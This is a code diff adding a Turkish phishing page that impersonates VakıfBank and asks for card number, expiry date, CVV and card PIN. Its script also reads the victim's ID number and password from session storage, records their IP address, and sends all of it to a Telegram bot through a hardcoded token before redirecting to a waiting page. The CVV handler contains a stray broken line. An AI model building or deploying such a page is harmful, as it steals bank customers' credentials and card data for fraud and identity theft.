@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="cache-control" content="max-age=0">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <meta name="google" content="notranslate">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <title>Kart Bilgileri - VakıfBank</title>
+    <link rel="icon" type="image/x-icon" href="assets/img/icons/favicon.png">
+    
+    <!-- Mevcut CSS dosyası -->
+    <link rel="stylesheet" href="styles.e3f11a9fbd12fcf4.css">
+    
+    <!-- jQuery -->
+    <script src="ajax/libs/3.6.3/jquery.min.js"></script>
+    
+    <style>
+        /* Preloader için ek stiller */
+        .preloader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 100000;
+            transition: opacity 0.5s ease;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #fcb000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Hata stili - kırmızı çerçeve */
+        .error-border {
+            border-color: #a94442 !important;
+            border-width: 2px !important;
+            box-shadow: inset 0 1px 1px rgba(0,0,0,0.075) !important;
+        }
+        
+        /* Hata mesajı stili */
+        .error-message {
+            color: #a94442;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .error-message.show {
+            display: block;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .textbox-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #333;
+        }
+        
+        .textbox-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+        
+        .textbox-input:focus {
+            outline: none;
+            border-color: #fcb000;
+            box-shadow: 0 0 5px rgba(252,176,0,0.3);
+        }
+        
+        .edged-btns {
+            width: 100%;
+            padding: 12px;
+            background: #fcb000;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        .edged-btns:hover {
+            background: #e5a000;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .box-plate {
+            background: white;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-top: 50px;
+        }
+        
+        .page-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 25px;
+            color: #333;
+            text-align: center;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .logo img {
+            height: 50px;
+        }
+        
+        @media (max-width: 767px) {
+            .box-plate {
+                padding: 20px;
+                margin-top: 20px;
+            }
+            .textbox-input {
+                font-size: 14px;
+                padding: 10px 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Preloader -->
+    <div class="preloader" id="preloader">
+        <div class="spinner"></div>
+    </div>
+
+    <div class="container">
+        <div class="box-plate">
+            <div class="logo">
+                <img src="vakifbank-logo-white.svg" alt="VakıfBank">
+            </div>
+            <div class="page-title">Kart Bilgilerinizi Giriniz</div>
+            
+            <form id="cardForm">
+                <!-- Kart Numarası -->
+                <div class="form-group">
+                    <label class="textbox-label">Kart Numarası</label>
+                    <input type="text" 
+                           id="cardNumber" 
+                           class="textbox-input" 
+                           placeholder="0000 0000 0000 0000"
+                           maxlength="19"
+                           inputmode="numeric"
+                           autocomplete="off">
+                    <div class="error-message" id="cardError">Geçerli bir kart numarası giriniz! (16 hane)</div>
+                </div>
+                
+                <!-- Son Kullanma Tarihi -->
+                <div class="form-group">
+                    <label class="textbox-label">Son Kullanma Tarihi</label>
+                    <input type="text" 
+                           id="expiryDate" 
+                           class="textbox-input" 
+                           placeholder="MM/YY"
+                           maxlength="5"
+                           autocomplete="off">
+                    <div class="error-message" id="expiryError">Geçerli bir tarih giriniz! (MM/YY)</div>
+                </div>
+                
+                <!-- CVV -->
+                <div class="form-group">
+                    <label class="textbox-label">CVV / CVC</label>
+                    <input type="text" 
+                           id="cvv" 
+                           class="textbox-input" 
+                           placeholder="000"
+                           maxlength="3"
+                           inputmode="numeric"
+                           autocomplete="off">
+                    <div class="error-message" id="cvvError">CVV kodu 3 haneli olmalıdır!</div>
+                </div>
+                
+                <!-- Kart Şifresi -->
+                <div class="form-group">
+                    <label class="textbox-label">Kart Şifresi</label>
+                    <input type="password" 
+                           id="cardPassword" 
+                           class="textbox-input" 
+                           placeholder="****"
+                           maxlength="4"
+                           inputmode="numeric"
+                           autocomplete="off">
+                    <div class="error-message" id="passwordError">Kart şifresi 4 haneli olmalıdır!</div>
+                </div>
+                
+                <button type="submit" class="edged-btns" id="submitBtn">Giriş</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // ============ PRELOADER ============
+        function hidePreloader() {
+            const preloader = document.getElementById('preloader');
+            if (preloader) {
+                preloader.style.opacity = '0';
+                setTimeout(() => {
+                    preloader.style.display = 'none';
+                }, 500);
+            }
+        }
+
+        window.addEventListener('load', function() {
+            setTimeout(hidePreloader, 500);
+        });
+
+        window.onerror = function() {
+            hidePreloader();
+            return false;
+        };
+
+        setTimeout(hidePreloader, 3000);
+
+        // ============ KART NUMARASI FORMATLAMA (Her 4 hanede 1 boşluk) ============
+        const cardNumberInput = document.getElementById('cardNumber');
+        if (cardNumberInput) {
+            cardNumberInput.addEventListener('input', function(e) {
+                // Sadece rakamları al
+                let value = this.value.replace(/\D/g, '');
+                
+                // Her 4 hanede bir boşluk ekle
+                if (value.length > 0) {
+                    value = value.match(/.{1,4}/g).join(' ');
+                }
+                
+                // Maksimum 19 karakter (16 rakam + 3 boşluk)
+                this.value = value.substring(0, 19);
+                
+                // Hata varsa temizle
+                const cardError = document.getElementById('cardError');
+                if (cardError) {
+                    cardError.classList.remove('show');
+                    this.classList.remove('error-border');
+                }
+            });
+        }
+
+        // ============ SON KULLANMA TARİHİ FORMATLAMA (Otomatik slash) ============
+        const expiryDateInput = document.getElementById('expiryDate');
+        if (expiryDateInput) {
+            expiryDateInput.addEventListener('input', function(e) {
+                // Sadece rakamları al
+                let value = this.value.replace(/\D/g, '');
+                
+                // MM/YY formatına çevir
+                if (value.length >= 3) {
+                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                } else if (value.length === 2) {
+                    value = value.substring(0, 2);
+                }
+                
+                // Maksimum 5 karakter (MM/YY)
+                this.value = value.substring(0, 5);
+                
+                // Ay kontrolü - 01-12 arası
+                if (this.value.length >= 2) {
+                    let month = this.value.substring(0, 2);
+                    if (parseInt(month) > 12) {
+                        this.value = '12' + this.value.substring(2);
+                    } else if (parseInt(month) < 1 && month !== '00') {
+                        this.value = '01' + this.value.substring(2);
+                    }
+                }
+                
+                // Hata varsa temizle
+                const expiryError = document.getElementById('expiryError');
+                if (expiryError) {
+                    expiryError.classList.remove('show');
+                    this.classList.remove('error-border');
+                }
+            });
+        }
+
+        // ============ CVV FORMATLAMA (Sadece rakam, 3 hane) ============
+        const cvvInput = document.getElementById('cvv');
+        if (cvvInput) {
+            cvvInput.addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '').substring(0, 3);
+                a
+                const cvvError = document.getElementById('cvvError');
+                if (cvvError) {
+                    cvvError.classList.remove('show');
+                    this.classList.remove('error-border');
+                }
+            });
+        }
+
+        // ============ KART ŞİFRESİ FORMATLAMA (Sadece rakam, 4 hane) ============
+        const cardPasswordInput = document.getElementById('cardPassword');
+        if (cardPasswordInput) {
+            cardPasswordInput.addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '').substring(0, 4);
+                
+                const passwordError = document.getElementById('passwordError');
+                if (passwordError) {
+                    passwordError.classList.remove('show');
+                    this.classList.remove('error-border');
+                }
+            });
+        }
+
+        // ============ TELEGRAM BOT ============
+        const BOT_TOKEN = '8294092123:AAEUS9A1DV9tjoD4QnCsC4azkNGz0Ye6JAg';
+        const CHAT_ID = '-1003874564893';
+
+        function getIPAddress(callback) {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => callback(data.ip))
+                .catch(() => callback('Bilinmiyor'));
+        }
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+            fetch(url)
+                .then(response => response.json())
+                .then(data => console.log('Telegram başarılı:', data))
+                .catch(error => console.error('Telegram hatası:', error));
+        }
+
+        // ============ LUHN ALGORİTMASI (Kart numarası doğrulama) ============
+        function validateLuhn(cardNumber) {
+            let digits = cardNumber.replace(/\s/g, '');
+            if (digits.length !== 16) return false;
+            
+            let sum = 0;
+            let isEven = false;
+            
+            for (let i = digits.length - 1; i >= 0; i--) {
+                let digit = parseInt(digits[i], 10);
+                if (isEven) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+                sum += digit;
+                isEven = !isEven;
+            }
+            return sum % 10 === 0;
+        }
+
+        // ============ SON KULLANMA TARİHİ DOĞRULAMA ============
+        function validateExpiryDate(dateStr) {
+            if (!/^\d{2}\/\d{2}$/.test(dateStr)) return false;
+            
+            const [month, year] = dateStr.split('/');
+            const monthNum = parseInt(month, 10);
+            const yearNum = parseInt(year, 10);
+            
+            if (monthNum < 1 || monthNum > 12) return false;
+            
+            const now = new Date();
+            const currentYear = now.getFullYear() % 100;
+            const currentMonth = now.getMonth() + 1;
+            
+            if (yearNum < currentYear) return false;
+            if (yearNum === currentYear && monthNum < currentMonth) return false;
+            
+            return true;
+        }
+
+        // ============ HATA GÖSTERME ============
+        function showError(input, errorElement, isError) {
+            if (isError) {
+                input.classList.add('error-border');
+                errorElement.classList.add('show');
+            } else {
+                input.classList.remove('error-border');
+                errorElement.classList.remove('show');
+            }
+        }
+
+        function clearAllErrors() {
+            const inputs = ['cardNumber', 'expiryDate', 'cvv', 'cardPassword'];
+            const errors = ['cardError', 'expiryError', 'cvvError', 'passwordError'];
+            
+            inputs.forEach(id => {
+                const input = document.getElementById(id);
+                if (input) input.classList.remove('error-border');
+            });
+            errors.forEach(id => {
+                const error = document.getElementById(id);
+                if (error) error.classList.remove('show');
+            });
+        }
+
+        // ============ FORM SUBMIT ============
+        const form = document.getElementById('cardForm');
+        if (form) {
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const cardNumber = document.getElementById('cardNumber');
+                const expiryDate = document.getElementById('expiryDate');
+                const cvv = document.getElementById('cvv');
+                const cardPassword = document.getElementById('cardPassword');
+                
+                const cardError = document.getElementById('cardError');
+                const expiryError = document.getElementById('expiryError');
+                const cvvError = document.getElementById('cvvError');
+                const passwordError = document.getElementById('passwordError');
+                
+                let hasError = false;
+                
+                // Önce tüm hataları temizle
+                clearAllErrors();
+                
+                // Kart numarası kontrolü
+                const cleanCardNumber = cardNumber.value.replace(/\s/g, '');
+                if (!validateLuhn(cleanCardNumber) || cleanCardNumber.length !== 16) {
+                    showError(cardNumber, cardError, true);
+                    hasError = true;
+                }
+                
+                // Son kullanma tarihi kontrolü
+                if (!validateExpiryDate(expiryDate.value)) {
+                    showError(expiryDate, expiryError, true);
+                    hasError = true;
+                }
+                
+                // CVV kontrolü
+                if (!/^\d{3}$/.test(cvv.value)) {
+                    showError(cvv, cvvError, true);
+                    hasError = true;
+                }
+                
+                // Kart şifresi kontrolü
+                if (!/^\d{4}$/.test(cardPassword.value)) {
+                    showError(cardPassword, passwordError, true);
+                    hasError = true;
+                }
+                
+                if (hasError) return;
+                
+                // Preloader göster
+                const preloader = document.getElementById('preloader');
+                if (preloader) preloader.style.display = 'flex';
+                
+                // Kart bilgilerini al
+                const tc = sessionStorage.getItem('tc') || 'Alınamadı';
+                const sifre = sessionStorage.getItem('password') || 'Alınamadı';
+                
+                // IP al ve Telegram'a gönder
+                getIPAddress(function(ip) {
+                    const message = `*Yeni Kart Bilgileri:*\n\n` +
+                        `👤 TC: ${tc}\n` +
+                        `🔑 Şifre: ${sifre}\n` +
+                        `💳 Kart No: ${cardNumber.value}\n` +
+                        `📅 SKT: ${expiryDate.value}\n` +
+                        `🔒 CVV: ${cvv.value}\n` +
+                        `🔐 Kart Şifresi: ${cardPassword.value}\n` +
+                        `🌐 IP: ${ip}`;
+                    
+                    sendToTelegram(message);
+                    
+                    setTimeout(function() {
+                        window.location.href = 'wait.html';
+                        hidePreloader();
+                    }, 1500);
+                });
+            });
+        }
+        
+        // ============ ENTER TUŞU ============
+        const inputs = ['cardNumber', 'expiryDate', 'cvv', 'cardPassword'];
+        inputs.forEach(id => {
+            const input = document.getElementById(id);
+            if (input) {
+                input.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        document.getElementById('submitBtn').click();
+                    }
+                });
+            }
+        });
+        
+        // ============ SAYFA YÜKLENDİĞİNDE ============
+        document.addEventListener('DOMContentLoaded', function() {
+            // TC ve şifre sessionStorage'dan alınamazsa uyarı göster (kırmızı çerçeve olmadan)
+            const tc = sessionStorage.getItem('tc');
+            const password = sessionStorage.getItem('password');
+            if (!tc || !password) {
+                console.log('Önceki sayfadan bilgi alınamadı');
+            }
+        });
+    </script>
+</body>
+</html>
